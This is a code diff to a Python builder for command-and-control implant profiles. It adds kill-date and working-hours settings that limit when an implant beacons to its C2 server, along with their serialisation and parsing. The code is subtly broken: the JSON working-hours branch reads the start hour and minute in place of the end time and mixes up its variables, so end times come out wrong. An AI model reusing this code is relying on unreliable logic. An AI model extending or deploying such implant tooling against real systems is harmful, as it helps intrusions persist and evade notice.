@@ -19,6 +19,7 @@ from zlib import crc32
 from shlex import split
 from io import StringIO
 from hashlib import sha512
+from datetime import datetime
 from json import dumps, loads
 from secrets import token_bytes
 from traceback import format_exc
@@ -82,7 +83,7 @@ OPERATION ARGUMENTS:
 
 BUILD ARGUMENTS:
  SYSTEM:
-  --host            <hostname>  Hostname hint. (Not valid for Listeners).
+  --host            <hostname>  Hostname hint, used for implants only.
   --sleep           <secs|mod>  Sleep time period. Defaults to seconds
                                   for integers, but can take modifiers
                                   such as 's', 'h', 'm'. (ex: 2m or 3s).
@@ -99,6 +100,30 @@ BUILD ARGUMENTS:
                                   group.
 
                                   See SELECTOR VALUES for more info.
+  --killdate        <ISO-8601>  Specify a time in ISO-8601 format that
+                                  be used to indicate when the implant
+                                  will cease to function. The time should
+                                  be specified in ISO-8601 format which is
+                                  "YYYY-MM-DDTHH:MM:SS". The seconds may
+                                  be omitted.
+  --wh-days         <S-M-S str> Specify a Working hours value that targets
+                                  specific days. This may be used in combonation
+                                  with the "--wh-start" and "--wh-end" arguments.
+                                  The accepted values are "SMTWRFS". Note:
+                                  Sunday is the first day and must be the first
+                                  'S' to be parsed correctly. All other chars
+                                  may be out of order if needed.
+  --wh-start        <HH:MM>     Specify a time in an HOURS:MINS format that
+                                  specifies when the implant may start connecting
+                                  with the C2 Server. This setting takes affect
+                                  if there is a day or end value set.
+  --wh-end          <HH:MM>     Specify a time in an HOURS:MINS format that
+                                  specifies when the implant will stop connecting
+                                  with the C2 Server. This setting will apply
+                                  regardless of day or start setting and if a
+                                  day or start time does NOT exist, this will
+                                  instruct the implant to wait until midnight to
+                                  try again.
 
  CONNECTION HINTS (Max 1 per Profile Group):
   --tcp                         Use the TCP Connection hint.
@@ -217,6 +242,8 @@ class Cfg:
         SLEEP = 0xA1
         JITTER = 0xA2
         WEIGHT = 0xA3
+        KILLDATE = 0xA4
+        WORKHOURS = 0xA5
         SEPARATOR = 0xFA
 
         LAST_VALID = 0xAA
@@ -256,6 +283,8 @@ class Cfg:
             SLEEP: "sleep",
             JITTER: "jitter",
             WEIGHT: "weight",
+            KILLDATE: "killdate",
+            WORKHOURS: "workhours",
             SEPARATOR: "|",
             LAST_VALID: "select-last",
             ROUND_ROBIN: "select-round-robin",
@@ -290,6 +319,8 @@ class Cfg:
             "sleep": SLEEP,
             "jitter": JITTER,
             "weight": WEIGHT,
+            "killdate": KILLDATE,
+            "workhours": WORKHOURS,
             "|": SEPARATOR,
             "select-last": LAST_VALID,
             "select-round-robin": ROUND_ROBIN,
@@ -413,6 +444,31 @@ class Cfg:
     @staticmethod
     def separator():
         return Cfg.Const.as_single(Cfg.Const.SEPARATOR)
+
+    @staticmethod
+    def killdate(v):
+        if v is None:
+            t = 0
+        elif isinstance(v, datetime):
+            t = int(v.timestamp())
+        elif not isinstance(v, str):
+            raise ValueError("killdate: invalid date value type")
+        elif len(v) == 0:
+            t = 0
+        else:
+            t = int(datetime.fromisoformat(v).timestamp())
+        s = Setting(9)
+        s[0] = Cfg.Const.KILLDATE
+        s[1] = (t >> 56) & 0xFF
+        s[2] = (t >> 48) & 0xFF
+        s[3] = (t >> 40) & 0xFF
+        s[4] = (t >> 32) & 0xFF
+        s[5] = (t >> 24) & 0xFF
+        s[6] = (t >> 16) & 0xFF
+        s[7] = (t >> 8) & 0xFF
+        s[8] = t & 0xFF
+        del t
+        return s
 
     @staticmethod
     def connect_ip(p):
@@ -580,6 +636,51 @@ class Cfg:
             s[x + 3] = key[x]
         for x in range(0, len(iv)):
             s[x + len(key) + 3] = iv[x]
+        return s
+
+    @staticmethod
+    def workhours(days, start, end):
+        if not Utils.nes(days) and not Utils.nes(start) and not Utils.nes(end):
+            raise ValueError("workhours: empty values specified")
+        d = 0
+        if Utils.nes(days):
+            d = Utils.parse_weekdays(days)
+        h, j = 0, 0
+        if Utils.nes(start):
+            if ":" not in start:
+                raise ValueError("workhours: invalid start format")
+            x = start.split(":")
+            if len(x) != 2:
+                raise ValueError("workhours: invalid start format")
+            try:
+                h, j = int(x[0]), int(x[1])
+            except ValueError:
+                raise ValueError("workhours: invalid start format")
+            del x
+            if h > 23 or j > 59:
+                raise ValueError("workhours: invalid start format")
+        n, m = 0, 0
+        if Utils.nes(end):
+            if ":" not in end:
+                raise ValueError("workhours: invalid end format")
+            x = end.split(":")
+            if len(x) != 2:
+                raise ValueError("workhours: invalid end format")
+            try:
+                n, m = int(x[0]), int(x[1])
+            except ValueError:
+                raise ValueError("workhours: invalid end format")
+            del x
+            if n > 23 or m > 59:
+                raise ValueError("workhours: invalid end format")
+        s = Setting(6)
+        s[0] = Cfg.Const.WORKHOURS
+        s[1] = d
+        s[2] = h
+        s[3] = j
+        s[4] = n
+        s[5] = m
+        del d, h, j, n, m
         return s
 
     @staticmethod
@@ -887,6 +988,27 @@ class Utils:
         return d
 
     @staticmethod
+    def to_weekdays(v):
+        if not isinstance(v, (int, float)) or v == 0 or v > 126:
+            return "SMTWRFS"
+        r = ""
+        if v & 1 != 0:
+            r += "S"
+        if v & 2 != 0:
+            r += "M"
+        if v & 4 != 0:
+            r += "T"
+        if v & 8 != 0:
+            r += "W"
+        if v & 16 != 0:
+            r += "R"
+        if v & 32 != 0:
+            r += "F"
+        if v & 64 != 0:
+            r += "S"
+        return r
+
+    @staticmethod
     def _leading_int(s):
         i = 0
         x = 0
@@ -901,6 +1023,31 @@ class Utils:
                 raise OverflowError()
             i += 1
         return x, s[i:]
+
+    @staticmethod
+    def parse_weekdays(v):
+        if not Utils.nes(v):
+            return 0
+        d = 0
+        for x in range(0, len(v)):
+            if v[x] == "s" or v[x] == "S":
+                if x == 0:
+                    d |= 1
+                else:
+                    d |= 64
+            elif v[x] == "m" or v[x] == "M":
+                d |= 2
+            elif v[x] == "t" or v[x] == "T":
+                d |= 4
+            elif v[x] == "w" or v[x] == "W":
+                d |= 8
+            elif v[x] == "r" or v[x] == "R":
+                d |= 16
+            elif v[x] == "f" or v[x] == "F":
+                d |= 32
+            else:
+                raise ValueError("bad weekday char")
+        return d
 
     @staticmethod
     def _fmt_int(b, s, v):
@@ -1151,6 +1298,33 @@ class Config(bytearray):
                         | int(self[i + 1]) << 56
                     )
                 )
+            elif self[i] == Cfg.Const.KILLDATE:
+                if i + 8 >= n:
+                    raise ValueError("killdate: invalid setting")
+                u = (
+                    int(self[i + 8])
+                    | int(self[i + 7]) << 8
+                    | int(self[i + 6]) << 16
+                    | int(self[i + 5]) << 24
+                    | int(self[i + 4]) << 32
+                    | int(self[i + 3]) << 40
+                    | int(self[i + 2]) << 48
+                    | int(self[i + 1]) << 56
+                )
+                if u == 0:
+                    o = ""
+                else:
+                    o = datetime.fromtimestamp(u).isoformat()
+            elif self[i] == Cfg.Const.WORKHOURS:
+                if i + 5 >= n:
+                    raise ValueError("workhours: invalid setting")
+                o = {
+                    "start_hour": self[i + 2],
+                    "start_min": self[i + 3],
+                    "end_hour": self[i + 4],
+                    "end_min": self[i + 5],
+                    "days": Utils.to_weekdays(self[i + 1]),
+                }
             elif (
                 self[i] == Cfg.Const.IP
                 or self[i] == Cfg.Const.B64S
@@ -1356,9 +1530,9 @@ class Config(bytearray):
             or self[i] == Cfg.Const.TLS_EX
         ):
             return i + 2
-        if self[i] == Cfg.Const.CBK:
+        if self[i] == Cfg.Const.CBK or self[i] == Cfg.Const.WORKHOURS:
             return i + 6
-        if self[i] == Cfg.Const.SLEEP:
+        if self[i] == Cfg.Const.SLEEP or self[i] == Cfg.Const.KILLDATE:
             return i + 9
         if self[i] == Cfg.Const.WC2:
             if i + 7 >= len(self):
@@ -1462,19 +1636,56 @@ class Config(bytearray):
             if not isinstance(p, int):
                 raise ValueError("jitter: invalid JSON value")
             if p < 0 or p > 100:
-                raise ValueError("b64s: invalid JSON value")
+                raise ValueError("jitter: invalid JSON value")
             return self.add(Cfg.jitter(p))
         if m == Cfg.Const.WEIGHT:
             if not isinstance(p, int):
-                raise ValueError("ip: invalid JSON value")
+                raise ValueError("weight: invalid JSON value")
             if p < 0:
-                raise ValueError("b64s: invalid JSON value")
+                raise ValueError("weight: invalid JSON value")
             return self.add(Cfg.weight(p))
+        if m == Cfg.Const.KILLDATE:
+            if not Utils.nes(p):
+                raise ValueError("killdate: invalid JSON value")
+            return self.add(Cfg.killdate(p))
+        if m == Cfg.Const.WORKHOURS:
+            if not isinstance(p, dict):
+                raise ValueError("workhours: invalid JSON value")
+            h, j = p.get("start_hour"), p.get("start_min")
+            n, m = p.get("start_hour"), p.get("start_min")
+            if h is None:
+                h = 0
+            elif not isinstance(h, (int, float)):
+                raise ValueError("workhours: invalid JSON value")
+            if j is None:
+                j = 0
+            elif not isinstance(j, (int, float)):
+                raise ValueError("workhours: invalid JSON value")
+            if n is None:
+                m = 0
+            elif not isinstance(n, (int, float)):
+                raise ValueError("workhours: invalid JSON value")
+            if m is None:
+                m = 0
+            elif not isinstance(m, (int, float)):
+                raise ValueError("workhours: invalid JSON value")
+            if h > 23 or j > 59 or n > 23 or m > 59:
+                raise ValueError("workhours: invalid JSON value")
+            d = Utils.parse_weekdays(p.get("days", ""))
+            s = Setting(6)
+            s[0] = Cfg.Const.WORKHOURS
+            s[1] = d
+            s[2] = h
+            s[3] = j
+            s[4] = n
+            s[5] = m
+            del d, h, j, n, m
+            return self.add(s)
         if m == Cfg.Const.IP:
             if not isinstance(p, int):
                 raise ValueError("ip: invalid JSON value")
             if p < 0:
-                raise ValueError("b64s: invalid JSON value")
+                raise ValueError("ip: invalid JSON value")
             return self.add(Cfg.connect_ip(p))
         if m == Cfg.Const.WC2:
             if not isinstance(p, dict):
@@ -1492,7 +1703,7 @@ class Config(bytearray):
             if not isinstance(p, int) and p > 0:
                 raise ValueError("tls-ex: invalid JSON value")
             if p < 0:
-                raise ValueError("b64s: invalid JSON value")
+                raise ValueError("tls-ex: invalid JSON value")
             return self.add(Cfg.connect_tls_ex(p))
         if m == Cfg.Const.MTLS:
             if not isinstance(p, dict):
@@ -1671,6 +1882,11 @@ class _Builder(ArgumentParser):
             ],
         )
 
+        self.add_argument("--killdate", type=str, dest="killdate")
+        self.add_argument("--wh-days", type=str, dest="workhours_days")
+        self.add_argument("--wh-start", type=str, dest="workhours_start")
+        self.add_argument("--wh-end", type=str, dest="workhours_end")
+
         c = self.add_mutually_exclusive_group(required=False)
         c.add_argument("--tcp", dest="tcp", action="store_true")
         c.add_argument("--tls", dest="tls", action="store_true")
@@ -1781,11 +1997,6 @@ class _Builder(ArgumentParser):
             d[v] = len(w) - 1
         e = [None] * len(w)
         del w, a
-        if "xor" in d and d["xor"] != len(e) - 1:
-            print(
-                "WARNING: XOR wrappers that are NOT used last can cause decoding issues!",
-                file=stderr,
-            )
         return d, e
 
     def parse_args(self):
@@ -1810,6 +2021,14 @@ class _Builder(ArgumentParser):
             config.add(Cfg.jitter(args.jitter))
         if isinstance(args.weight, int):
             config.add(Cfg.weight(args.weight))
+        if args.killdate:
+            config.add(Cfg.killdate(args.killdate))
+        if args.workhours_days or args.workhours_start or args.workhours_end:
+            config.add(
+                Cfg.workhours(
+                    args.workhours_days, args.workhours_start, args.workhours_end
+                )
+            )
         if args.selector:
             if args.selector == "last":
                 config.add(Cfg.selector_last_valid())
